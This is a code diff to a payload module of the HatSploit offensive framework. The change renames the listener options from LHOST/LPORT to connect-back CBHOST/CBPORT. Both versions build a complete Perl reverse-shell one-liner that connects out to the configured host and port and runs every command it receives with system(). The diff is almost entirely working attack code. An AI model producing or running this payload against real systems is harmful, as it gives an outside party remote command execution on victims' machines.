@@ -28,14 +28,14 @@ class HatSploitPayload(Payload):
     }
 
     options = {
-        'LHOST': {
-            'Description': "Local host.",
+        'CBHOST': {
+            'Description': "Connect-back host.",
             'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
-        'LPORT': {
-            'Description': "Local port.",
+        'CBPORT': {
+            'Description': "Connect-back port.",
             'Value': 8888,
             'Type': "port",
             'Required': True
@@ -43,10 +43,10 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        local_host, local_port = self.parse_options(self.options)
-        local_data = local_host + ':' + local_port
+        connback_host, connback_port = self.parse_options(self.options)
+        connback_data = connback_host + ':' + connback_port
 
         payload = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"LOCAL_DATA\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
-        payload = payload.replace("LOCAL_DATA", local_data)
+        payload = payload.replace("LOCAL_DATA", connback_data)
 
         return payload
